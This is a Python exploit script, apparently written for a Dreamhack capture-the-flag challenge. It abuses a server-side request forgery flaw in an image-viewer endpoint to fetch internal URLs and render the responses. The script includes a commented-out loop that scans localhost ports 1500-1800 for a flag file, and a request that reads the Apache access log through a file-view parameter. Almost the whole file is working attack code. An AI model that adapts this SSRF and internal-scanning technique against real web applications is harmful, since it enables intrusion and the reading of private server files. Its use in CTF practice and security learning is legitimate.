import requests
from bs4 import BeautifulSoup
import base64
from PIL import Image
from shutil import copyfile
import os

TARGET_URL = 'http://host1.dreamhack.games:8910'


def ssrf(fileuri):
    data = {
        "url": fileuri
    }

    res = requests.post(f"{TARGET_URL}/img_viewer", data=data)
    soup = BeautifulSoup(res.text, 'html.parser')
    res = soup.find_all('img')
    img = res[0]['src'][len('data:image/png;base64,'):].strip()
    img = base64.b64decode(img)

    with open("image.png", "wb") as f:
        f.write(img)

    if (os.path.isfile('error.png')) and img!=open('error.png','rb').read():
        type = os.popen('file image.png').read()[len('image.png: '):]

        if 'png' in type.lower():
            im = Image.open(r"image.png")
            im.show()
        elif 'html' in type.lower():
            soup = BeautifulSoup(img, 'html.parser')
            print(soup.prettify())
            copyfile('./image.png', './image.html')
            file = 'file://'+os.path.join(os.getcwd(),'image.html')
            os.system(f'firefox --headless --screenshot {file}')
            im = Image.open(r"screenshot.png")
            im.show()
        elif 'text' in type.lower():
            soup = BeautifulSoup(img, 'html.parser')
            print(soup.prettify())

        return True

    else:
        return False

def defineErrorPng():
    ssrf('http://localhost:9999')
    copyfile('./image.png', './error.png')

if not (os.path.isfile('error.png')):
    defineErrorPng()

'''
for p in range (1500,1801):
    print(p)
    res = ssrf(f'http://localhost:{p}/flag.txt')
    if res:
        break
'''
ssrf('http://localhost/view.php?file=/var/log/apache2/access.log')
#ssrf('http://localhost/list.php')
